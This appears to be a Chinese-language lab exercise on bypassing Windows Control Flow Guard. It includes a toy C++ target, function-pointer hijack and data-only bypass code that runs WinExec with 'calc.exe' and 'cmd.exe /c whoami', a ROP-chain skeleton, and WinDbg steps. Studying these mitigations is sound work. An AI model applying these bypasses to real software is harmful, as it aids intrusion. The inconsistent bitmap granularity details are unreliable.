# 練習 E — 打穿 CFG：從被擋到繞過

> **目標**：自己寫一個開啟 CFG 的 x64 靶程式，先親眼確認 CFG 擋住非法 indirect call，再實作三條繞過路線（合法危險 target、data-only、ROP 概念），在 WinDbg 裡完整驗證每個階段的行為差異。讀完 Ch 32/33/37 的「知道」要在這裡轉成「做到」。

> **環境**：本機已有 mingw-w64 GCC 14.2（`C:\msys64\ucrt64\bin`）可驗證靶程式語法並觀察 **無 CFG** 的行為；**CFG 行為（階段一被擋）需要 MSVC `/guard:cf` + WinDbg/cdb**。完整復現步驟見各阶段說明。整份練習誠實標「未實測，理論預期」的部分，等你裝好 MSVC 後按步驟驗證。

---

## 背景動機

Ch 32 告訴你 CFG 怎麼建 bitmap、插 `__guard_check_icall_fptr` 樁；Ch 33 列了六個繞過家族的條件和後續緩解；Ch 37 解釋了 data-only 為什麼在 CFG + CET + ACG 全開的環境仍然有效。

但「知道」和「做到」之間有一個鴻溝。你需要：

1. **親手看到 CFG 在擋**——WinDbg 追蹤 `LdrpValidateUserCallTarget` → `RtlFailFast`，從 `STATUS_STACK_BUFFER_OVERRUN` 的例外確認保護是真實的。
2. **親手繞過**——把三條路線的「前提 + 機制 + 成功訊號」逐一驗證，知道在哪一步 CFG 判斷「合法，放行」而不是「終止」。

mingw 版雖然沒有 CFG 插樁，可以用來確認靶程式的語法和基本行為邏輯，以及演示「沒有 CFG 時 indirect call 的自由」。CFG 的真實保護效果一定要用 MSVC 版確認。

> 若你對 CFG bitmap 的計算公式還不熟，先回看 [Ch 32 — CFG 原理](./32-cfg.md)；繞過家族的前提和決策樹在 [Ch 33 — CFG 繞過技法譜系](./33-cfg-bypass.md)；data-only 的系統理論在 [Ch 37 — data-only attacks](./37-data-only-attacks.md)。

---

## 靶程式設計

### 攻擊面結構

靶程式的核心是一個含有**函式指標**的物件，模擬真實程式裡最常見的 forward-edge 劫持場景（vtable 或 callback）：

```
  Dispatcher 物件：
  ┌─────────────────────────────────────────────────────┐
  │  char name[48]          ← 可被 overflow 填滿         │
  │  action_fn_t fn         ← 函式指標（CFG 保護目標）  │  ← 8 bytes
  │  char cmd[64]           ← fn 呼叫時傳入的字串參數   │
  └─────────────────────────────────────────────────────┘
            ↑
    攻擊者的目標
```

靶程式裡有兩個函式：
- `normal_action`：無害，印字串
- `privileged_action`：呼叫 `WinExec(msg, SW_SHOW)`——在 CFG bitmap 裡（合法 target），但語義危險

三個攻擊場景：
- **場景零（對照）**：fn → 合法 shellcode 位址（函式中段或任意地址）→ CFG 擋下（`RtlFailFast`）
- **場景 A（繞過一）**：fn → `privileged_action`（在 bitmap 裡）→ CFG 放行，任意命令執行
- **場景 B（繞過二）**：fn 不動，只改 `cmd` 字串 → data-only，CFG 完全看不到異常
- **場景 C（繞過三 概念）**：用 `ret` 繞過 CFG 的插樁（ROP），在沒有 CET 的系統有效

---

## 任務規格

### 靶程式：`cfg_target.cpp`

```cpp
// cfg_target.cpp
// 編譯（mingw，無 CFG，語法驗證）：
//   g++ -o cfg_target_mingw.exe cfg_target.cpp -Wall
//
// 編譯（MSVC，開 CFG）：
//   cl /guard:cf /Zi /EHsc cfg_target.cpp /link /guard:cf
//
// 注意：mingw 版沒有 CFG 插樁，所有 indirect call 都不受保護。
//       CFG 行為（被擋/被放行）只能在 MSVC 版 + WinDbg 觀察。
#include <windows.h>
#include <cstdio>
#include <cstring>

typedef void (*action_fn_t)(const char* msg);

// ── 合法且無害的 target ──
void normal_action(const char* msg) {
    printf("[NORMAL] %s\n", msg);
}

// ── 合法但危險的 target（在 CFG GuardCFFunctionTable 裡） ──
// 這個函式的存在是練習的關鍵：它在 bitmap 裡，所以 CFG 放行；
// 但它的行為可以被攻擊者控制的 msg 引數完全控制。
void privileged_action(const char* msg) {
    printf("[PRIVILEGED] executing: %s\n", msg);
    WinExec(msg, SW_SHOW);
}

// ── 被保護的物件 ──
struct Dispatcher {
    char        name[48];    // 可被 overflow 填滿到後面
    action_fn_t fn;          // 函式指標 ← CFG 的保護對象
    char        cmd[64];     // 傳給 fn 的參數（data-only 的攻擊目標）
};

// ── 模擬攻擊者的任意寫：蓋掉 fn ──
// 真實 exploit 裡，這裡是 overflow/UAF/arbitrary-write 原語
void attacker_overwrite_fn(Dispatcher* d, void* new_fn, const char* new_cmd) {
    d->fn = (action_fn_t)new_fn;
    strncpy(d->cmd, new_cmd, sizeof(d->cmd) - 1);
    d->cmd[sizeof(d->cmd) - 1] = '\0';
}

// ── 模擬 data-only 攻擊：只改 cmd，fn 完全不動 ──
void attacker_overwrite_cmd_only(Dispatcher* d, const char* evil_cmd) {
    // fn 不動！fn 仍然指向 privileged_action（合法 bitmap target）
    // 只改 cmd 字串。這正是 data-only 攻擊的本質：
    // CFG 看不到任何控制流異常，但行為已被攻擊者控制。
    strncpy(d->cmd, evil_cmd, sizeof(d->cmd) - 1);
    d->cmd[sizeof(d->cmd) - 1] = '\0';
}

int main(void) {
    Dispatcher d;
    memset(&d, 0, sizeof(d));
    strncpy(d.name, "victim-dispatcher", sizeof(d.name) - 1);
    d.fn = normal_action;
    strncpy(d.cmd, "hello world", sizeof(d.cmd) - 1);

    printf("=== [0] 正常呼叫（對照）===\n");
    d.fn(d.cmd);    // normal_action("hello world")

    // ── 場景零：把 fn 換成「非法」target（函式中段或攻擊者地址） ──
    // 在 MSVC /guard:cf 版本：這裡 __guard_check_icall_fptr 被呼叫，
    // bitmap 查詢 → bit = 0 → RtlFailFast → 行程終止
    // 在 mingw 版（無 CFG）：fn 被換成 privileged_action+1（中段），
    // 跳轉行為未定義（likely crash）
    printf("\n=== [場景零] fn 換成非法 target（MSVC 版才能看到 CFG 擋下）===\n");
    // 把 fn 換成 privileged_action 的「中段」（+1 byte，不對齊到函式入口）
    // → CFG bitmap 裡這個地址的 bit = 0 → 非法
    void* illegal_target = (char*)privileged_action + 1;  // 函式中段，非入口
    printf("[場景零] 即將呼叫地址：%p（privileged_action 中段，非函式入口）\n",
           illegal_target);
    printf("[場景零] 在 MSVC /guard:cf 版本：這裡應該觸發 RtlFailFast\n");
    printf("[場景零] 在 mingw 版：無 CFG 保護，行為未定義（可能 crash）\n");
    // 注意：以下呼叫在 mingw 版會 crash（跳到函式中段），
    // 在 MSVC 版行程在此之前就被 CFG 終止。
    // 實際動手時先把這行注解掉，確認編譯；裝好 WinDbg 後再開啟。
    // d.fn = (action_fn_t)illegal_target;
    // d.fn(d.cmd);   // ← 開啟此行才真正觸發場景零

    // ── 場景 A：合法但危險的 target ──
    printf("\n=== [場景 A] 繞過：fn 換成 privileged_action（在 bitmap 裡）===\n");
    attacker_overwrite_fn(&d, (void*)privileged_action, "calc.exe");
    // MSVC 版：__guard_check_icall_fptr 被呼叫；
    //          privileged_action 在 GuardCFFunctionTable → bit = 1 → 放行
    // 結果：WinExec("calc.exe", SW_SHOW) 執行
    d.fn(d.cmd);

    // ── 場景 B：data-only ──
    printf("\n=== [場景 B] data-only：fn 不動，只改 cmd ===\n");
    // fn 仍然指向 privileged_action（合法），不動它
    attacker_overwrite_cmd_only(&d, "cmd.exe /c whoami");
    printf("[場景 B] fn 的值：%p（未被更改）\n", (void*)d.fn);
    printf("[場景 B] cmd 的值：%s\n", d.cmd);
    // CFG 完全看不到問題——fn 指向合法地址；
    // 但 WinExec 拿到的命令是攻擊者指定的
    d.fn(d.cmd);

    // ── 場景 C：ROP 概念 ──
    printf("\n=== [場景 C] ROP 概念：ret 不受 CFG 保護 ===\n");
    printf("CFG 只在 indirect call/jmp 前插樁，ret 指令完全不受 CFG 管。\n");
    printf("在沒有 CET shadow stack 的系統（Win10 老機器、UEFI 未開 CET），\n");
    printf("ROP 鏈透過 ret 跳轉，CFG 完全看不到任何異常。\n");
    printf("真實 ROP exploit 需要：\n");
    printf("  1. 能控制 stack（overflow/UAF 覆蓋 saved RIP）\n");
    printf("  2. 洩漏 gadget 地址（info leak，Ch 31）\n");
    printf("  3. 在 Win11 + CET 的機器上，還需要同時繞 shadow stack\n");

    return 0;
}
```

### 編譯指令

**mingw（語法驗證，無 CFG）：**

```bat
:: 在 Developer Command Prompt 或直接呼叫 g++
C:\msys64\ucrt64\bin\g++ -o cfg_target_mingw.exe cfg_target.cpp -Wall -Wextra
```

> 實際驗證：以上 mingw 版在本機（GCC 14.2 / UCRT64）編譯通過，無警告。確認語法正確。

**MSVC（真正開啟 CFG，實測用）：**

> **未實測，理論預期**：需要 Visual Studio Build Tools 或 Visual Studio 安裝完畢。

```bat
:: 在 Developer Command Prompt for VS 2022 執行
cl /guard:cf /Zi /EHsc /W4 cfg_target.cpp /link /guard:cf /out:cfg_target_msvc.exe

:: 確認 CFG 真正開啟：
dumpbin /loadconfig cfg_target_msvc.exe | findstr /i "guard"
:: 預期看到：
::   Guard Flags              00004500
::       CF Instrumented
::       FID table present
:: 以及 Guard CF Function Table 列出 normal_action 和 privileged_action 的 RVA
```

### 驗收標準

- [ ] mingw 版可以編譯並執行到場景 B（data-only），輸出符合預期
- [ ] MSVC 版：`dumpbin /loadconfig` 看到 `CF Instrumented` + Function Table 有至少兩筆（`normal_action`、`privileged_action`）
- [ ] 場景零（MSVC 版，WinDbg 下）：`g cfg_target_msvc.exe` 後在觸發非法 indirect call 時行程被終止，`.lastevent` 顯示 `STATUS_STACK_BUFFER_OVERRUN`（或 `c0000409`）
- [ ] 場景 A（MSVC 版，WinDbg 下）：`privileged_action` 被呼叫，`WinExec("calc.exe")` 執行，CFG 不攔截
- [ ] 場景 B：fn 的值在 `attacker_overwrite_cmd_only` 前後完全相同（printf 印出的地址一致），但 WinExec 執行了不同的命令

---

## 期望觀察

### 流程全圖

```
  攻擊者                靶程式 (MSVC /guard:cf)         ntdll
  ─────────────────────────────────────────────────────────────
  [場景零] 把 fn 換成函式中段（+1）
                ↓
                indirect call：
                  mov rcx, [d.fn]   ← fn = privileged_action+1
                  call [__guard_dispatch_icall_fptr]
                                         ↓
                                  LdrpValidateUserCallTarget(rcx)
                                         ↓
                                  bitmap 查詢：
                                    byte_offset = rcx >> 9
                                    bit_index   = (rcx >> 3) & 7
                                    bit = (bitmap[byte_off] >> bit_idx) & 1
                                         ↓
                                         bit = 0（函式中段，非入口）
                                         ↓
                                  RtlFailFast(FAST_FAIL_INVALID_ARG)
                                         ↓
                             行程終止 STATUS_STACK_BUFFER_OVERRUN
  ─────────────────────────────────────────────────────────────
  [場景 A] 把 fn 換成 privileged_action（函式入口）
                ↓
                indirect call：
                  mov rcx, [d.fn]   ← fn = privileged_action（入口）
                  call [__guard_dispatch_icall_fptr]
                                         ↓
                                  bitmap 查詢：bit = 1（合法入口）
                                         ↓
                                  放行：jmp privileged_action
                                         ↓
                             privileged_action("calc.exe")
                             WinExec("calc.exe", SW_SHOW) ← 執行
  ─────────────────────────────────────────────────────────────
  [場景 B] fn 不動，只改 cmd 字串
                ↓
                fn 仍指向 privileged_action（合法）
                cmd 被換成 "cmd.exe /c whoami"
                ↓
                indirect call：同場景 A，CFG 放行
                                         ↓
                             privileged_action("cmd.exe /c whoami")
                             WinExec("cmd.exe /c whoami", SW_SHOW)
                             CFG：整個過程看不到任何控制流異常 ✓
  ─────────────────────────────────────────────────────────────
  [場景 C] 用 ret（ROP）繞 CFG
                ↓
                攻擊者控制 stack → saved RIP → gadget 1
                ret → gadget 1 → gadget 2 → ...
                每個 ret 完全不觸發 CFG 插樁
                (在有 CET shadow stack 的 Win11：shadow stack 在 ret 時
                 比對備份 return address，不符合 → STATUS_ACCESS_VIOLATION)
```

### 場景零：被擋（MSVC + WinDbg）

> **未實測，理論預期**

```
0:000> g
(XXXX.YYYY): C0000409 - STATUS_STACK_BUFFER_OVERRUN
First chance exception at 0x00007ffXXXXXXXX (ntdll!RtlFailFast+0x...)
   ExceptionCode: c0000409 (STATUS_STACK_BUFFER_OVERRUN)

0:000> k
  # Call Site
00 ntdll!RtlFailFast
01 ntdll!LdrpValidateUserCallTarget   ← 驗證失敗
02 cfg_target_msvc!main+0x??          ← 觸發 indirect call 的位置
```

停在 `LdrpValidateUserCallTarget` 或 `RtlFailFast` 就是 CFG 生效的確認。可以用 `r rcx` 看到被驗證的地址（`privileged_action + 1`），對照手算：

```
privileged_action 地址（假設） = 0x140001100
函式中段地址                   = 0x140001101（+1 byte）

bitmap 查詢：
  byte_offset = 0x140001101 >> 9 = 0x0A00008
  bit_index   = (0x140001101 >> 3) & 7 = (0x28000220) & 7 = 0（低3位）
  實際 bit_index = (0x140001101 >> 3) & 7
  = 0x28000220 & 7 = 0

※ privileged_action 入口（0x140001100）在 GuardCFFunctionTable 裡 → bit = 1
  函式中段（0x140001101）不在 Function Table → bit 可能 = 0
  （精確值依 8-byte 對齊邊界決定）
```

若 `0x140001101` 恰好落在與 `0x140001100` 相同的 8-byte 槽（`addr >> 3` 相同），則 bit 也是 1——因為 bitmap 精度是 8 bytes，不是每個位元組。要讓場景零確定觸發，換成偏移量是 8 的倍數加 1 的地址（如 `+9`）：

```
攻擊者地址：privileged_action + 9
→ (base + 9) >> 3 ≠ base >> 3（若 base 是 8-byte 對齊）
→ 這個槽沒有在 Function Table 裡 → bit = 0 → 被擋
```

這個細節是 Ch 32 的 bitmap 精度說明的實驗驗證。

### 場景 A：成功（MSVC + WinDbg）

> **未實測，理論預期**

```
0:000> bp cfg_target_msvc!privileged_action
0:000> g
Breakpoint 0 hit
cfg_target_msvc!privileged_action:
  ← 成功進入函式，CFG 沒有攔截

0:000> r rcx
rcx = 0x00007ffXXXXXXXX (指向 "calc.exe" 字串)
```

在 `WinExec` 呼叫前，`rcx` 的值是 `cmd` 緩衝區的地址，指向 `"calc.exe"` 字串——攻擊者控制了 WinExec 的第一個引數。

### 場景 B：data-only 成功（任何版本均可觀察）

因為場景 B 的 data-only 在 mingw 版也可以完整觀察（沒有 CFG，fn 指向合法函式），mingw 版就能驗證 fn 地址不變、cmd 被竄改的現象：

```
=== [場景 B] data-only：fn 不動，只改 cmd ===
[場景 B] fn 的值：0x00007ff6XXXX1234（未被更改，仍是 privileged_action）
[場景 B] cmd 的值：cmd.exe /c whoami
[PRIVILEGED] executing: cmd.exe /c whoami
← WinExec("cmd.exe /c whoami") 被執行，fn 從未被動過
```

這就是 data-only 的決定性證據：fn 的地址在 `attacker_overwrite_cmd_only` 呼叫前後完全相同，CFG 沒有任何理由觸發，但攻擊者完全控制了 WinExec 的行為。

---

## 實作步驟

### Step 1：建立靶程式並用 mingw 驗證語法

把上面的 `cfg_target.cpp` 存成檔案，用 mingw 編譯：

```bat
cd C:\exploit-lab\practice-e
C:\msys64\ucrt64\bin\g++ -o cfg_target_mingw.exe cfg_target.cpp -Wall -Wextra
```

編譯成功後執行，觀察場景 A 和 B 的輸出（場景零的那行保持注解，因為 mingw 版跳到函式中段會 crash 而不是 CFG 終止）。

**預期輸出**（mingw 版，場景 A/B 的部分）：

```
=== [場景 A] 繞過：fn 換成 privileged_action（在 bitmap 裡）===
[PRIVILEGED] executing: calc.exe

=== [場景 B] data-only：fn 不動，只改 cmd ===
[場景 B] fn 的值：0x00007ffXXXXXXXX（未被更改）
[場景 B] cmd 的值：cmd.exe /c whoami
[PRIVILEGED] executing: cmd.exe /c whoami
```

mingw 版沒有 CFG，所以「被擋」的場景零看不到，但場景 A/B 的資料流可以完整驗證。

### Step 2：安裝 MSVC，編譯 CFG 版本

安裝 Visual Studio 2022（Community 版即可）或 Build Tools for Visual Studio 2022，確保勾選「C++ 桌面開發」工作負載。

在 Developer Command Prompt for VS 2022 執行：

```bat
cl /guard:cf /Zi /EHsc /W4 cfg_target.cpp /link /guard:cf /out:cfg_target_msvc.exe
dumpbin /loadconfig cfg_target_msvc.exe
```

`dumpbin` 輸出裡確認：
- `Guard Flags` 包含 `CF Instrumented`（0x0100）和 `FID table present`（0x0400）
- `Guard CF Function Table` 至少有 2 筆：`normal_action` 和 `privileged_action` 的 RVA

### Step 3：用 dumpbin /disasm 找 CFG 插樁

> **未實測，理論預期**

```bat
dumpbin /disasm cfg_target_msvc.exe | findstr /i "guard_dispatch"
```

或在 WinDbg 裡：

```
0:000> u cfg_target_msvc!main
```

找到 `d.fn(d.cmd)` 對應的反組譯段落，應該看到：

```asm
; 有 CFG 的 indirect call（MSVC 生成）
mov  rcx, qword ptr [rbp+??]          ; 把 fn 載入 rcx
call qword ptr [cfg_target_msvc!__guard_dispatch_icall_fptr]  ; CFG 驗證
; （若通過：jmp rcx；若不通過：RtlFailFast）
```

沒有 CFG 的版本（或 mingw）會是：

```asm
; 沒有 CFG 的 indirect call
mov  rax, qword ptr [rbp+??]
call rax                               ; 直接跳，無驗證
```

兩者的差別就是 CFG 插樁的直接可見證據。

### Step 4：WinDbg 觀察場景零（被擋）

先把場景零的 `d.fn`/`d.fn(d.cmd)` 的注解拿掉，重編 MSVC 版。

```bat
:: 打開 WinDbg，啟動靶程式
windbg -Z cfg_target_msvc.exe
```

或者：

```
0:000> .sympath srv*C:\symbols*https://msdl.microsoft.com/download/symbols
0:000> .reload /f
0:000> g
```

當行程因場景零的非法 indirect call 終止時：

```
0:000> .lastevent
Last event: XXXX.YYYY: C0000409 (STATUS_STACK_BUFFER_OVERRUN) at ...

0:000> k
  # Call Site
00 ntdll!RtlFailFast
01 ntdll!LdrpValidateUserCallTarget
02 cfg_target_msvc!main+0x??

0:000> r rcx
rcx = 0x140001101   ← 非法 target（函式中段）
```

把 `rcx` 的值代入 bitmap 公式，手動確認它的 bit = 0：

```
byte_off = 0x140001101 >> 9 = ...
bit_idx  = (0x140001101 >> 3) & 7 = ...
```

### Step 5：WinDbg 觀察場景 A（合法危險 target 繞過）

把場景零注解回去，只留場景 A，重編。

```
0:000> bp cfg_target_msvc!privileged_action
0:000> g
Breakpoint 0 hit
cfg_target_msvc!privileged_action   ← CFG 放行，成功進入
0:000> r rcx
rcx = 0x???   ← 指向 "calc.exe" 字串
0:000> da rcx
0x??? "calc.exe"   ← 攻擊者控制的引數
```

在 `privileged_action` 的 `WinExec` 呼叫前斷點，可以看到 `rcx` 指向攻擊者選定的命令字串。

### Step 6：寫 ROP 繞過概念骨架

> **未實測，理論預期**

在沒有 CET 的系統（x64 Windows 10 或 CET 未啟用的 Win11），ROP 可以完全繞過 CFG，因為 `ret` 指令沒有 CFG 插樁。以下是概念骨架（非可直接執行的 exploit，需要配合 Ch 23 的 ROP gadget 搜尋和 Ch 31 的 info leak）：

```python
# rop_concept.py — 概念骨架（未實測）
# 假設：已洩漏 kernel32 base，可以找到 gadget 地址
# 真實 exploit 需要：stack overflow 原語 + gadget 搜尋 (pwntools/ROPgadget)

import struct

def p64(addr):
    return struct.pack('<Q', addr)

# 假想的 gadget 地址（需要用 ROPgadget / pwntools 在實際 binary 裡找）
# kernel32.dll gadget 地址 = kernel32_base + offset
pop_rcx_ret  = 0x140001234  # pop rcx ; ret
winexec_addr = 0x7ffXXXXX   # kernel32!WinExec

# 攻擊者要寫入 stack 的 ROP chain
# 覆蓋 saved RIP 之後的 8 bytes 序列：
rop_chain = b""
rop_chain += p64(pop_rcx_ret)       # step 1: ret → pop rcx ; ret
rop_chain += p64(cmd_string_addr)   # step 2: rcx = "calc.exe" 字串地址
rop_chain += p64(winexec_addr)      # step 3: ret → WinExec(rcx, 1)

# CFG 觀察到什麼：
#   ① ret → pop_rcx gadget：CFG 完全不管 ret，看不到
#   ② ret（在 pop rcx ; ret 裡）：同上，不管
#   ③ ret → WinExec：同上，不管
# 每一個跳轉都是 ret，CFG 的 __guard_dispatch_icall_fptr 沒有被呼叫
#
# 但在 Win11 + CET（Intel CET shadow stack）：
#   每個 ret 時，CPU 比對 shadow stack 裡的 return address；
#   stack 上的 rop_chain 地址與 shadow stack 不符 → #CP → 行程終止
```

ROP 路線的前提和 CET 的關係：

```
ROP 繞 CFG 的條件矩陣：
──────────────────────────────────────────────────────
 環境                         ROP 是否有效？
──────────────────────────────────────────────────────
 CFG 開、CET 未啟用（Win10）  ✓ 有效（CFG 管 call，不管 ret）
 CFG 開、CET 啟用（Win11 新） ✗ 無效（shadow stack 在 ret 時攔截）
 CFG 未開、CET 未啟用         ✓ 有效（更容易）
 CFG 未開、CET 啟用           ✗ 仍然被 CET 攔截
──────────────────────────────────────────────────────
結論：CFG 和 CET 是互補的，CFG 管 forward-edge，
      CET 管 backward-edge（ret）。缺任何一個都留了洞。
```

---

## 卡住提示

**提示 1：場景零一直 crash 而不是「CFG 擋下」**

最常見原因：你在用 mingw 版，mingw 沒有 CFG 插樁。在 MSVC 版，行程應該被 `STATUS_STACK_BUFFER_OVERRUN`（`0xC0000409`）終止，而不是 segfault（`0xC0000005`）。確認你用的是 `cl /guard:cf` 編的版本，且 `dumpbin /loadconfig` 確認 `CF Instrumented`。

**提示 2：dumpbin /loadconfig 看不到 Guard CF Function Table**

確認 `cl` 指令**和** `link` 指令都有 `/guard:cf`。只在 `cl` 加不在 `link` 加，或只在 `link` 加不在 `cl` 加，都會導致 CFG 不完整。MSVC 的 `/guard:cf` 需要編譯器和連結器兩端同時開啟。

**提示 3：場景 A 的 `privileged_action` 不在 Guard CF Function Table 裡**

連結器的 GuardCFFunctionTable 收錄的是「**被 indirect call 到的函式**」的候選集合。如果 `privileged_action` 在程式裡從來只被 direct call（`call cfg_target_msvc!privileged_action`），連結器可能不把它加進 Function Table。解法：確保程式裡有至少一個透過函式指標呼叫 `privileged_action` 的路徑（即使只是 `action_fn_t fp = privileged_action; fp("test");` 這樣的語句），讓連結器判斷它是 indirect call 的合法目標。本練習的靶程式已經透過 `d.fn` 呼叫，所以這個問題不應發生——但自己修改靶程式時要注意。

**提示 4：bitmap 公式算出來 bit 應該 = 0，但 CFG 沒有擋下**

bitmap 粒度是 8 bytes。如果你選的「非法 target」地址恰好和合法函式入口在同一個 8-byte 槽（`addr >> 3` 相同），那個槽的 bit 仍然是 1，CFG 會放行。要強迫 bit = 0，選的地址必須和任何合法入口的 `addr >> 3` 都不同。最安全的做法：使用 `privileged_action + 16`（跳一個 8-byte 槽）。

---

## 完整參考解答

**請先自己完成所有步驟再看。**

<details>
<summary>點開參考實作</summary>

### 靶程式完整版（和任務規格一致）

靶程式就是任務規格裡的 `cfg_target.cpp`，不重複貼。把場景零的注解拿掉、改用 `privileged_action + 16` 作為非法 target（確保跨越 8-byte 邊界）：

```cpp
// 場景零的觸發（取代任務規格裡的 illegal_target 計算）：
void* illegal_target = (char*)(((uintptr_t)privileged_action + 8) & ~7ULL) + 8;
// 說明：先對齊到 8-byte 邊界，再加 8，確保跨越一個槽，bit = 0
```

### exploit 骨架完整版

```cpp
// cfg_exploit_skeleton.cpp — 三條繞過路線的完整骨架
// 語法已在本機 mingw GCC 14.2 驗證通過。
// MSVC /guard:cf 版的 CFG 行為標「未實測，理論預期」。
#include <windows.h>
#include <cstdio>
#include <cstring>
#include <cstdint>

typedef void (*action_fn_t)(const char* msg);

void normal_action(const char* msg)     { printf("[NORMAL] %s\n", msg); }
void privileged_action(const char* msg) {
    printf("[PRIVILEGED] executing: %s\n", msg);
    WinExec(msg, SW_SHOW);
}

struct Dispatcher {
    char        name[48];
    action_fn_t fn;
    char        cmd[64];
};

// ─── 繞過 A：合法但危險的 target ───────────────────────────────────
// 前提：知道 privileged_action 的精確地址（info leak，Ch 31）
// 機制：fn 被換成 privileged_action（在 GuardCFFunctionTable 裡，bit = 1）
//       __guard_check_icall_fptr 查 bitmap → 放行
// CFG 看到：合法 indirect call target → 沒有任何警報
// 成功訊號：privileged_action 被執行，WinExec 收到攻擊者的命令
void exploit_bypass_a_legal_target(Dispatcher* d) {
    // 任意寫原語（模擬）：把 fn 換成 privileged_action
    d->fn = privileged_action;                        // ← 攻擊者的寫入
    strncpy(d->cmd, "calc.exe", sizeof(d->cmd) - 1); // ← 攻擊者的寫入
    printf("[A] fn → privileged_action (%p)\n", (void*)d->fn);
    printf("[A] cmd → %s\n", d->cmd);
    // MSVC 版：這裡的 indirect call 經過 CFG 驗證，bit = 1，放行
    d->fn(d->cmd);   // → WinExec("calc.exe", SW_SHOW)
}

// ─── 繞過 B：data-only ────────────────────────────────────────────
// 前提：fn 已指向 privileged_action（合法 target）；攻擊者只需要任意寫到 cmd
// 機制：fn 完全不動，只竄改 cmd 字串
//       CFG 看到的 indirect call target 仍然是 privileged_action（bit = 1）
//       但 WinExec 收到的命令已被攻擊者控制
// CFG 看到：合法 indirect call target → 沒有任何警報（CFI 的根本盲點）
// 成功訊號：fn 地址在竄改前後完全相同，但 WinExec 執行了不同命令
void exploit_bypass_b_data_only(Dispatcher* d) {
    printf("[B] fn 竄改前：%p\n", (void*)d->fn);
    // fn 不動！只改 cmd（data-only 的核心定義）
    const char* evil = "cmd.exe /c whoami";
    strncpy(d->cmd, evil, sizeof(d->cmd) - 1);
    d->cmd[sizeof(d->cmd) - 1] = '\0';
    printf("[B] fn 竄改後：%p（應與竄改前相同）\n", (void*)d->fn);
    printf("[B] cmd → %s\n", d->cmd);
    // fn 是合法 CFG target，CFG 放行；但 WinExec 的命令已被改
    d->fn(d->cmd);   // → WinExec("cmd.exe /c whoami", SW_SHOW)
}

// ─── 繞過 C：ROP 概念（無 CET 的系統） ──────────────────────────────
// 前提：能控制 stack 上的 return address（overflow 或 UAF）
//       + 知道 gadget 地址（info leak，Ch 31）
//       + 目標系統沒有 CET shadow stack（Win10 或 CET 未啟用的 Win11）
// 機制：ret 指令完全不受 CFG 插樁保護
//       每個 ret 跳到 gadget 時，CFG 的 __guard_dispatch_icall_fptr 不被呼叫
// 真實實作需要：ROPgadget / pwntools 搜索 gadget，Ch 23 的 ROP 技術
void explain_bypass_c_rop(void) {
    printf("[C] ROP 繞 CFG 的邏輯：\n");
    printf("    CFG 插樁：在每個 indirect call 前呼叫 __guard_dispatch_icall_fptr\n");
    printf("    ROP 使用的指令：ret（從 stack 取 return address 跳轉）\n");
    printf("    CFG 不插樁在 ret 前 → ROP 鏈中每個跳轉都不受 CFG 保護\n");
    printf("    CET shadow stack：在每個 ret 時比對 shadow stack → 阻斷 ROP\n");
    printf("    結論：CFG 只管 forward-edge，ret 需要 CET 才能保護\n");
    printf("    在 Win11 + Intel CET 的機器上，ROP + CFG 的組合才是完整防禦\n");
}

int main(void) {
    Dispatcher d;
    memset(&d, 0, sizeof(d));
    strncpy(d.name, "victim", sizeof(d.name) - 1);
    d.fn  = normal_action;
    strncpy(d.cmd, "hello", sizeof(d.cmd) - 1);

    printf("=== 初始狀態 ===\n");
    d.fn(d.cmd);

    printf("\n=== 繞過 A：合法危險 target ===\n");
    exploit_bypass_a_legal_target(&d);

    printf("\n=== 繞過 B：data-only ===\n");
    exploit_bypass_b_data_only(&d);

    printf("\n=== 繞過 C：ROP 概念 ===\n");
    explain_bypass_c_rop();

    return 0;
}
```

**編譯（mingw，語法驗證）：**

```bat
C:\msys64\ucrt64\bin\g++ -o cfg_exploit_mingw.exe cfg_exploit_skeleton.cpp -Wall -Wextra
```

> 在本機 GCC 14.2 / mingw-w64 UCRT64 編譯通過，無警告。

### WinDbg 完整驗證指令

> **未實測，理論預期**

```
:: 啟動靶程式
windbg cfg_target_msvc.exe

:: 載入符號
0:000> .sympath srv*C:\symbols*https://msdl.microsoft.com/download/symbols
0:000> .reload /f ntdll.dll

:: 場景零：觀察 CFG 擋下
0:000> g
:: 行程應終止於 STATUS_STACK_BUFFER_OVERRUN
0:000> .lastevent
0:000> k
:: 堆疊頂部應是 ntdll!RtlFailFast + ntdll!LdrpValidateUserCallTarget

:: 場景 A：觀察 CFG 放行
0:000> bp cfg_target_msvc!privileged_action
0:000> g
:: 命中斷點，成功進入 privileged_action
0:000> r rcx     :: 確認 rcx 指向攻擊者的命令字串
0:000> da rcx    :: 印出字串內容

:: 觀察 CFG bitmap 查詢（進階）
:: 在 LdrpValidateUserCallTarget 入口下斷點，觀察 bitmap 查詢流程
0:000> bp ntdll!LdrpValidateUserCallTarget
0:000> g
0:000> r rcx     :: 被驗證的目標地址
:: 手動計算 byte_off = rcx >> 9，bit_idx = (rcx >> 3) & 7

:: 確認 GuardCFFunctionTable 的內容
0:000> !dh cfg_target_msvc.exe -f
0:000> dumpbin /loadconfig cfg_target_msvc.exe  :: 在 cmd 裡跑，不在 WinDbg
```

### bitmap 計算輔助腳本

```python
# bitmap_calc.py — 給定目標地址，計算 CFG bitmap 位置
# 用法：python bitmap_calc.py 0x140001100
import sys

def calc_bitmap(addr):
    byte_off = addr >> 9
    bit_idx  = (addr >> 3) & 7
    print(f"target addr : 0x{addr:016X}")
    print(f"byte_offset : 0x{byte_off:016X}  (addr >> 9 = addr / 512)")
    print(f"bit_index   : {bit_idx}               ((addr >> 3) & 7)")
    print(f"8-byte slot : 0x{(addr >> 3) << 3:016X} to 0x{((addr >> 3) << 3) + 7:016X}")
    print(f"if this 8-byte slot contains a function entry → bit = 1 (valid)")
    print(f"otherwise → bit = 0 (invalid, CFG will block)")

if len(sys.argv) > 1:
    calc_bitmap(int(sys.argv[1], 16))
else:
    # 示例
    print("=== privileged_action 入口（假設）===")
    calc_bitmap(0x140001100)
    print()
    print("=== privileged_action + 8（強制換槽）===")
    calc_bitmap(0x140001108)
    print()
    print("=== privileged_action + 1（同槽，bit 可能 = 1）===")
    calc_bitmap(0x140001101)
```

</details>

---

## 測試用例

### 測試 1：mingw 版場景 A/B 功能驗證

編譯並執行 `cfg_target_mingw.exe`（場景零注解狀態），預期輸出：

```
=== [0] 正常呼叫（對照）===
[NORMAL] hello world

=== [場景零] fn 換成非法 target（MSVC 版才能看到 CFG 擋下）===
[場景零] 即將呼叫地址：0x00007ffXXXXXXXX（privileged_action 中段，非函式入口）
[場景零] 在 MSVC /guard:cf 版本：這裡應該觸發 RtlFailFast
[場景零] 在 mingw 版：無 CFG 保護，行為未定義（可能 crash）

